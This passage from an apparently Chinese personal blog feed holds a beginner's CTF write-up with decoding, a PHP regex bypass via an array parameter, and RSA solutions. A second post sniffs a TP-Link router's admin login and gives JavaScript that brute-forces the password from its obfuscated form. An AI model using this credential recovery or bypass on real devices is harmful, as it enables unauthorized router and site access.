class="line">2</span><br></pre></td><td class="code"><pre><span class="line">常规编码啦~</span><br><span class="line">flag.txt这个就是文档了，对不对我可不敢保证，你看你能不能解出来吧。</span><br></pre></td></tr></table></figure></p><p><a href="http://149.28.22.177:10001/flag.txt" target="_blank" rel="noopener">flag.txt</a>提供了一个超链接来下载<br>nazo有道题跟这个挺像的，一看就是Js代码，丢进console里运行，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3D45353D39333D38383D45353D39333D38383D45353D39333D38383D45353D39333D38382C3D45343D42443D41303D45383D41323D41423D45393D41413D39373D45343D42413D38362C3D0A3D45343D42383D38443D45363D39383D41463D45383D42463D39393D45343D42383D41412C3D45353D42303D42313D45393D39373D41453D45343D42443D41303D45383D41373D41333D0A3D45343D42413D38363D45353D38443D38413D45353D41343D41393D45363D42303D39343D45343D42383D38443D45363D42303D3934</span><br></pre></td></tr></table></figure></p><p>这个编码只有数字和ABCD那应该是16进制的，转成ASCII码，网站<a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">http://www.ab126.com/goju/1711.html</a><br>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">=E5=93=88=E5=93=88=E5=93=88=E5=93=88,=E4=BD=A0=E8=A2=AB=E9=AA=97=E4=BA=86,=</span><br><span class="line">=E4=B8=8D=E6=98=AF=E8=BF=99=E4=B8=AA,=E5=B0=B1=E9=97=AE=E4=BD=A0=E8=A7=A3=</span><br><span class="line">=E4=BA=86=E5=8D=8A=E5=A4=A9=E6=B0=94=E4=B8=8D=E6=B0=94</span><br></pre></td></tr></table></figure></p><p>这个编码有很多等号，后面跟两位16进制的数，是Quoted-printable编码，网站<a href="http://web.chacuo.net/charsetquotedprintable" target="_blank" rel="noopener">http://web.chacuo.net/charsetquotedprintable</a><br>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">哈哈哈哈,你被骗了,不是这个,就问你解了半天气不气</span><br></pre></td></tr></table></figure></p><p>wdnmd…<br>重新看了一遍题目，好像出题人确实暗示了….对不对我可不敢保证…<br>右键查看源代码，发现一个隐藏的div<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span>能看到这个，证明你没有被利益迷住了眼睛<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span>5530565352465a46576a6454626b35745a46644f636c6836526e70594d6e64335a47315763325654526a6b3d<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span>emmmm，如果你是解过jsfuck才看到的这个，不要打出题人。。。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这一看以为还是16进制转ASCII，结果解出来是乱码..<br>经过一番搜索，发现Hex编码也是这样子的，网站<a href="https://www.107000.com/T-Hex/" target="_blank" rel="noopener">https://www.107000.com/T-Hex/</a><br>解码后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U0VSRFZFWjdTbk5tZFdOclh6RnpYMnd3ZG1Wc2VTRjk=</span><br></pre></td></tr></table></figure></p><p>最后…base64解码一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SERDVEZ7SnNmdWNrXzFzX2wwdmVseSF9</span><br></pre></td></tr></table></figure></p><p>再解码一次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDCTF&#123;Jsfuck_1s_l0vely!&#125;</span><br></pre></td></tr></table></figure></p><h3 id="T3-简单的代码审计-200"><a href="#T3-简单的代码审计-200" class="headerlink" title="T3 简单的代码审计 200"></a>T3 简单的代码审计 200</h3><p><a href="http://149.28.22.177:10003/" target="_blank" rel="noopener">http://149.28.22.177:10003/</a><br>右键查看源代码，有一行注释<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--hint:file=once.php--&gt;</span></span><br></pre></td></tr></table></figure></p><p>打开 <a href="http://149.28.22.177:10003/once.php" target="_blank" rel="noopener">http://149.28.22.177:10003/once.php</a><br>让你输入密码 有一个提示 “You password must be alphanumeric”<br>php代码审计里，好像可以跳过正则的检查，有两种方式<br>一种是%0空字符终止检查，一种是传入数组<br>第一种方式是不行滴<br>第二种打开<br><a href="http://149.28.22.177:10003/once.php?password[]=" target="_blank" rel="noopener">http://149.28.22.177:10003/once.php?password[]=</a><br>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: HDCTF&#123;Is_V3ry_1nteresting!&#125;</span><br></pre></td></tr></table></figure></p><p>第四道题sql注入可能我姿势太辣鸡，试了好多都成功不了，就放弃了…</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="T1-basic-rsa-50"><a href="#T1-basic-rsa-50" class="headerlink" title="T1 basic rsa 50"></a>T1 basic rsa 50</h3><p>这可能是最最最最简单的 rsa 了<br>密文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">27565231154623519221597938803435789010285480123476977081867877272451638645710</span><br></pre></td></tr></table></figure></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">关于rsa</a></p><p>总之记住几个重要的式子</p><script type="math/tex; mode=display">p,q是大质数</script><script type="math/tex; mode=display">N=p\times q</script><script type="math/tex; mode=display">\varphi(N)=\varphi(p)\varphi(q)=(p-1)(q-1)</script><script type="math/tex; mode=display">e和\varphi(N)互质,ed\equiv 1\pmod{\varphi(N)}</script><p>加密</p><script type="math/tex; mode=display">m^e\equiv c\pmod N</script><p>解密</p><script type="math/tex; mode=display">c^d\equiv m\pmod N</script><p>因为当时在海师大的机房做的，Windows下，Python3，代码是Python2还有库，修改了一下<br>encode.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import gmpy2</span></span><br><span class="line"><span class="comment">#from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"*****************"</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">print(b2a_hex(flag))</span><br><span class="line">c = pow(int(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></p><p>看一下encode代码，其实几乎所有参数都告诉了，我们要做的就是算一下d就完事了<br>因为没导入库什么的，我直接手写的扩展欧几里得<br>最后得到一串数字以后还要再搞一下…先转成hex，然后去掉前面的0x，再输出就行了<br>decode.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ex_gcd</span><span class="params">(dividend, divisor)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == divisor:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, dividend</span><br><span class="line">    x2, y2, remainder = ex_gcd(divisor, dividend % divisor)</span><br><span class="line">    x1 = y2</span><br><span class="line">    y1 = x2 - (dividend // divisor) * y2</span><br><span class="line">    <span class="keyword">return</span> x1, y1, remainder</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(gcd(e,phi))</span></span><br><span class="line"><span class="comment"># print(ex_gcd(20,17))</span></span><br><span class="line"><span class="comment"># print(ex_gcd(e,phi))</span></span><br><span class="line">x1, y1, rr = ex_gcd(e,phi)</span><br><span class="line"><span class="comment"># print((x1*e+y1*phi)%phi)</span></span><br><span class="line">d = x1+phi</span><br><span class="line"><span class="comment"># print(d*e%phi)</span></span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(hex(m))</span><br><span class="line">print(str(hex(m)))</span><br><span class="line">print(str(hex(m))[<span class="number">2</span>::<span class="number">1</span>])</span><br><span class="line">print(a2b_hex(str(hex(m))[<span class="number">2</span>::<span class="number">1</span>]))</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&apos;flag&#123;B4by_Rs4&#125;&apos;</span><br></pre></td></tr></table></figure></p><h3 id="T2-bbbbbbrsa-100"><a href="#T2-bbbbbbrsa-100" class="headerlink" title="T2 bbbbbbrsa 100"></a>T2 bbbbbbrsa 100</h3><p>babyrsa，还是一道 RSA 的题目~</p><p>同样<br>encode.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b32encode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd,iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"******************************"</span></span><br><span class="line"></span><br><span class="line">nbit = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">p = getPrime(nbit)</span><br><span class="line">q = getPrime(nbit)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">e = random.randint(<span class="number">50000</span>,<span class="number">70000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> gcd(e,phi) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        e -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">c = pow(int(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> b32encode(str(c))[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></p><p>enc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = 177077389675257695042507998165006460849</span><br><span class="line">n = 37421829509887796274897162249367329400988647145613325367337968063341372726061</span><br><span class="line">c = ==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM</span><br></pre></td></tr></table></figure></p><p>这次给了$p,n,c$，$e$是$[50000,70000)$之内随机一个合法的，反正就2w枚举$e$就行了<br>注意代码最后一个很鸡贼的地方，倒着输出了，其实也能看出来$c$的base64等号在后面<br>还有一个地方就是import的时候，<code>from base64 import b64encode as b32encode</code><br>233333<br>看似base32其实就是base64<br>$c$解码后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2373740699529364991763589324200093466206785561836101840381622237225512234632</span><br></pre></td></tr></table></figure></p><p>把所有的合法的全部输出<br>decode.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">n = <span class="number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span></span><br><span class="line">p = <span class="number">177077389675257695042507998165006460849</span></span><br><span class="line">q = n//p</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">c = <span class="number">2373740699529364991763589324200093466206785561836101840381622237225512234632</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ex_gcd</span><span class="params">(dividend, divisor)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == divisor:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, dividend</span><br><span class="line">    x2, y2, remainder = ex_gcd(divisor, dividend % divisor)</span><br><span class="line">    x1 = y2</span><br><span class="line">    y1 = x2 - (dividend // divisor) * y2</span><br><span class="line">    <span class="keyword">return</span> x1, y1, remainder</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">50000</span>,<span class="number">70001</span>):</span><br><span class="line">    <span class="keyword">if</span> gcd(e, phi) == <span class="number">1</span>:</span><br><span class="line">        d=ex_gcd(e, phi)[<span class="number">0</span>]</span><br><span class="line">        d=(d+phi)%phi</span><br><span class="line">        m=pow(c,d,n)</span><br><span class="line">        ss=str(hex(m))[<span class="number">2</span>::<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span>(len(ss)%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(a2b_hex(ss))</span><br></pre></td></tr></table></figure></p><p>然后输出到文件，查找flag，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&apos;flag&#123;rs4_1s_s1mpl3!#&#125;&apos;</span><br></pre></td></tr></table></figure></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>第一次打CTF，Capture The Flag， 感觉还是蛮有意思的，知识面比较广，面向的都是安全问题<br>这是第一届HDCTF，学长办的，总是非常感谢学长将CTF竞赛搬来让我们了解吧<br>这次题貌似不难，甚至比较简单，（虽然我也不会<br>剩下的题解有空就补<br>Thx for H4lo!</p><p>update 20190523 16:30</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用wireshark hark一次tplink的管理员登录</title>
      <link href="/blog/hack-wiresharktplink/"/>
      <url>/blog/hack-wiresharktplink/</url>
      
        <content type="html"><![CDATA[<p>听说tplink的管理员登录有蛮大漏洞的…记一次用wireshark捕获password</p><p>首先打开wireshark，选择捕获wlan0，无线网卡<br><img src="/img/hack-wiresharktplink/20190519125819.png" alt="20190519125819.png"></p><p>点击开始，然后打开tplogin.cn登录账户</p><p><img src="/img/hack-wiresharktplink/20190519125825.png" alt="20190519125825.png"></p><p>然后结束捕获，在捕获的结果中寻找http相关的流，然后追踪</p><p><img src="/img/hack-wiresharktplink/20190519125834.png" alt="20190519125834.png"></p><p>发现一条登录相关的流，追踪以后可以发现password<br><img src="/img/hack-wiresharktplink/20190519130333.png" alt="20190519130333.png"><br><img src="/img/hack-wiresharktplink/20190519130341.png" alt="20190519130341.png"></p><p>tplogin中password加密相关的函数在class.js中，搜索encode就可以发现<br><img src="/img/hack-wiresharktplink/20190519130425.png" alt="20190519130425.png"></p><p>把这段函数拿出来<br><img src="/img/hack-wiresharktplink/20190519130449.png" alt="20190519130449.png"><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">orgAuthPwd=<span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> securityEncode(a,<span class="string">"RDpbLfCPsJZ7fiv"</span>,<span class="string">"yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW"</span>)</span><br><span class="line">&#125;;</span><br><span class="line">securityEncode=<span class="function"><span class="keyword">function</span>(<span class="params">a,c,b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d=<span class="string">""</span>,e,f,g,h,k=<span class="number">187</span>,l=<span class="number">187</span>;</span><br><span class="line">    f=a.length;g=c.length;h=b.length;e=f&gt;g?f:g;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> m=<span class="number">0</span>;m&lt;e;m++)</span><br><span class="line">        l=k=<span class="number">187</span>,m&gt;=f?l=c.charCodeAt(m):m&gt;=g?k=a.charCodeAt(m):(k=a.charCodeAt(m),l=c.charCodeAt(m)),d+=b.charAt((k^l)%h);</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>可以发现他其实是一位一位加密的，每位独立的话，那挨个枚举就好了，首先枚举位数，在枚举每一位的字符，查看和加密后的是否相同。<br>我写了一个html代码来运行JavaScript<br><img src="/img/hack-wiresharktplink/20190519130455.png" alt="20190519130455.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"cnv1"</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"600"</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">orgAuthPwd=<span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> securityEncode(a,<span class="string">"RDpbLfCPsJZ7fiv"</span>,<span class="string">"yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW"</span>)&#125;;</span></span><br><span class="line"><span class="javascript">securityEncode=<span class="function"><span class="keyword">function</span>(<span class="params">a,c,b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> d=<span class="string">""</span>,e,f,g,h,k=<span class="number">187</span>,l=<span class="number">187</span>;</span></span><br><span class="line"><span class="undefined">f=a.length;g=c.length;h=b.length;e=f&gt;g?f:g;</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> m=<span class="number">0</span>;m&lt;e;m++)</span></span><br><span class="line"><span class="undefined">l=k=187,m&gt;=f?l=c.charCodeAt(m):m&gt;=g?k=a.charCodeAt(m):(k=a.charCodeAt(m),l=c.charCodeAt(m)),d+=b.charAt((k^l)%h);</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> d</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">decode=<span class="function"><span class="keyword">function</span>(<span class="params">c, b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a=<span class="string">""</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> d=<span class="string">"xbZ60JKy9TefbwK"</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> k=<span class="number">187</span>, l=<span class="number">187</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> e=c.length;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> h=b.length;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> g=c.length;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> res=<span class="string">""</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> f=<span class="number">0</span>; f&lt;e;f++) &#123;</span></span><br><span class="line"><span class="javascript">res=<span class="string">""</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;e; i++) &#123;</span></span><br><span class="line"><span class="undefined">l=k=187;</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j&lt;<span class="number">128</span>; j++) &#123;</span></span><br><span class="line"><span class="undefined">i&gt;=f?l=c.charCodeAt(i):i&gt;=g?k=j:k=j,l=c.charCodeAt(i);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(b.charAt((k^l)%h)==d.charAt(i)) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(j)</span></span><br><span class="line"><span class="javascript">res+=<span class="built_in">String</span>.fromCharCode(j);</span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(res);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"\n----\n"</span>);&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript">cc=<span class="string">"RDpbLfCPsJZ7fiv"</span>;</span></span><br><span class="line"><span class="javascript">dd=<span class="string">"yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW"</span>;</span></span><br><span class="line"><span class="undefined">decode(cc,dd);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如图，因为不知道长度，所以长度太长和太短都不合适，无法登录，中间长度和输入密码长度差不多的都可以登录，大概有3-4个的样子是可以成功登录的</p><p><img src="/img/hack-wiresharktplink/20190519130509.png" alt="20190519130509.png"><br><img src="/img/hack-wiresharktplink/20190519130522.png" alt="20190519130522.png"></p><p>登录成功<br><img src="/img/hack-wiresharktplink/20190519130525.png" alt="20190519130525.png"></p>]]></content>
      
      
      <categories>
          
          <category> hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireshark </tag>
            
            <tag> hark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据分析与挖掘笔记</title>
      <link href="/blog/note-data-analysis-and-mining/"/>
      <url>/blog/note-data-analysis-and-mining/</url>
      
